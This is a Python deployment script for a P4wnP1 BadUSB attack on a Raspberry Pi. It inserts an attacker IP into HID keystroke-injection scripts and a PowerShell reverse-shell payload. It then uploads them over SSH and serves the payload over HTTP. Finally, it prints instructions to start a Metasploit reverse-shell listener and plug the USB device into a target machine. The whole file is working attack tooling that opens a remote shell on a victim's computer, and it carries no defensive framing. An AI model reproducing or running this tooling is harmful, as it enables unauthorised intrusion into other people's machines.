#!/usr/bin/env python3
"""
P4WNP1 BadUSB Deploy Script
自动部署 payload 到树莓派
"""

import argparse
import os
import paramiko
import sys
import time


def deploy(pi_ip, pi_user, pi_pass, attacker_ip, attacker_port="4444", http_port="80"):
    print(f"[*] Connecting to {pi_ip}...")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(pi_ip, username=pi_user, password=pi_pass, timeout=10)
    print("[+] Connected!")
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Read and update staged_shell.js
    staged_path = os.path.join(script_dir, "..", "hid_scripts", "staged_shell.js")
    with open(staged_path, "r") as f:
        staged_js = f.read()
    staged_js = staged_js.replace("192.168.146.145", attacker_ip)
    
    # Read and update direct_shell.js
    direct_path = os.path.join(script_dir, "..", "hid_scripts", "direct_shell.js")
    with open(direct_path, "r") as f:
        direct_js = f.read()
    direct_js = direct_js.replace("192.168.146.145", attacker_ip)
    
    # Read and update rev.ps1
    ps1_path = os.path.join(script_dir, "..", "payloads", "rev.ps1")
    with open(ps1_path, "r") as f:
        rev_ps1 = f.read()
    rev_ps1 = rev_ps1.replace("192.168.146.145", attacker_ip)
    
    # Upload files
    sftp = ssh.open_sftp()
    
    files = [
        (staged_js, "/usr/local/P4wnP1/HIDScripts/staged_shell.js"),
        (direct_js, "/usr/local/P4wnP1/HIDScripts/direct_shell.js"),
        (rev_ps1, "/var/www/html/rev.ps1"),
    ]
    
    for content, remote_path in files:
        print(f"[*] Uploading -> {remote_path}")
        with sftp.open(remote_path, "w") as f:
            f.write(content)
    
    sftp.close()
    
    # Restart HTTP server
    print("[*] Restarting HTTP server...")
    ssh.exec_command("kill $(pgrep -f 'python3 -m http.server 80') 2>/dev/null")
    time.sleep(1)
    ssh.exec_command("cd /var/www/html && nohup python3 -m http.server 80 > /dev/null 2>&1 &")
    time.sleep(2)
    
    # Verify
    stdin, stdout, stderr = ssh.exec_command("curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/rev.ps1")
    code = stdout.read().decode().strip()
    print(f"[+] HTTP server: {code}")
    
    ssh.close()
    
    print("\n" + "="*50)
    print("[+] Deployment complete!")
    print("="*50)
    print(f"""
Next steps:
1. Kali MSF:
   msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {attacker_ip}; set LPORT {attacker_port}; exploit"

2. P4WNP1 Web (http://{pi_ip}:8000):
   TriggerActions -> TRIGGER_USB_GADGET_CONNECTED -> HIDScript -> staged_shell

3. Insert USB to target machine
""")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Deploy P4WNP1 BadUSB payload")
    parser.add_argument("--pi-ip", default="172.16.0.1", help="Raspberry Pi IP")
    parser.add_argument("--pi-user", default="root", help="SSH username")
    parser.add_argument("--pi-pass", default="toor", help="SSH password")
    parser.add_argument("--attacker-ip", required=True, help="Kali attacker IP")
    parser.add_argument("--attacker-port", default="4444", help="MSF listener port")
    parser.add_argument("--http-port", default="80", help="HTTP server port")
    
    args = parser.parse_args()
    deploy(args.pi_ip, args.pi_user, args.pi_pass, args.attacker_ip, args.attacker_port, args.http_port)
